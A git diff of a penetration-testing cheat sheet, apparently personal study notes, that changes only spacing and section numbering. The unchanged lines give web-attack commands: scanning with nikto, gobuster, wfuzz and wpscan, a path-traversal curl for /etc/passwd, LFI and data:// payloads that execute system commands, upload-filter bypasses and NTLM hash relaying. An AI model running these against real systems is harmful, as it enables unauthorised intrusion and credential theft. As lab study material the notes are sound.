@@ -114,10 +114,12 @@
 
 1. Enumerating Web Applications:
 	a. directories:
+
 	`whatweb https://www.sait.ca`
 	
 	`nikto -h https://192.168.44.30:8090`
-	`dirb https://10.0.2.15:12380 /usr/share/wordlists/dirb/common.txt`
+
+ 	`dirb https://10.0.2.15:12380 /usr/share/wordlists/dirb/common.txt`
 	
 	`gobuster dir -u google.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
 	
@@ -127,12 +129,14 @@
 	check the output of the wappalyzer browser extension 
 	
 	b. subdomains (must be added to /etc/hosts):
-	 `wfuzz -w subdomainWordlist.txt -u http://cmess.thm -H "HOST: FUZZ.cmess.thm"`
+	
+  	`wfuzz -w subdomainWordlist.txt -u http://cmess.thm -H "HOST: FUZZ.cmess.thm"`
 
 	`gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -d google.com`
 
 	c. WordPress:
-	`wpscan --url https://10.0.2.15:12380/blogblog/ --enumerate vp,u,vt,tt --verbose --disable-tls-checks --detection-mode aggressive --api-token <token>`
+	
+ 	`wpscan --url https://10.0.2.15:12380/blogblog/ --enumerate vp,u,vt,tt --verbose --disable-tls-checks --detection-mode aggressive --api-token <token>`
 
 	`wpscan --url http://192.168.250.244:80/ --enumerate ap,u,at,cb,tt --verbose --disable-tls-checks --detection-mode aggressive`
 
@@ -155,7 +159,7 @@
 
 	`curl -i <endpoint> -H 'Authorization: OAuth <token>'`
 
-2. XSS:
+3. XSS:
 	a. Enumeration:
 	Fuzz input fields with: `< > ' " { } ;`
 
@@ -164,7 +168,7 @@
 
 	WordPress Core XSS can lead to new admin user + code execution
 
-3. Directory/Path Traversal:
+4. Directory/Path Traversal:
 	`curl --path-as-is http://example.com/cms/login.php?language=../../../../.etc/passwd`
 
 	files to look for:
@@ -175,7 +179,7 @@
 		- C:\\inetpub\\logs\\LogFiles\\W3SVC1\\
 		- C:\\inetpub\\wwwroot\\web.config\\
 
-4. File inclusions:
+5. File inclusions:
 	1. LFI: 
 		enumerate service and version for known file inclusion vulnerabilities
 
@@ -202,7 +206,7 @@
 		5. `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/backup.php`
 		6. `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"`
 
-5. File Upload Vulnerabilities:
+6. File Upload Vulnerabilities:
 	1. security check bypasses:
 		1. .PHP, .pHP
 			1. [A list of valid PHP extensions from fuzzdb](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt)
@@ -213,7 +217,7 @@
 		6. if you can't upload executables, overwrite SSH keys
 		7. intercept the file and make it reference an instance of impacket-smbserver/ntlmrelayx to grab or relay the hash
 
-6. Command Injection:
+7. Command Injection:
 	1. fuzz input fields with `& && ; |` \` 
 
 **SQL Injection:**
